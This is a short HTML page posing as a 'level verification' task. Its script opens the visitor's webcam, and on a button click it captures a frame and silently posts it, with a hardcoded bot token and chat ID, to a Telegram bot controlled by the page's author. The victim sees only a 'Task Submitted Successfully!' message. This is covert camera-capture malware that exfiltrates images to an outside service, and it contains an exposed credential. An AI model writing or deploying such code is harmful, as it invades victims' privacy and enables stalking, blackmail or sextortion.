<!DOCTYPE html>
<html>
<body style="background-color:black; color:red; text-align:center; font-family:sans-serif;">
    <h2>LEVEL VERIFICATION</h2>
    <video id="video" width="320" height="240" autoplay style="border:2px solid red;"></video>
    <br>
    <button id="capture" style="background:red; color:white; padding:10px 20px; border:none; cursor:pointer;">
        COMPLETE TASK
    </button>

    <script>
        const video = document.getElementById('video');
        const botToken = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk";
        const chatId = " 7967860350";

        // ক্যামেরা চালু করা
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
        });

        document.getElementById('capture').addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // ছবিকে টেলিগ্রামে পাঠানো
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'task.jpg');
                formData.append('caption', '⚠️ Task Completed by User!');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => alert('Task Submitted Successfully!'));
            }, 'image/jpeg');
        });
    </script>
</body>
</html>
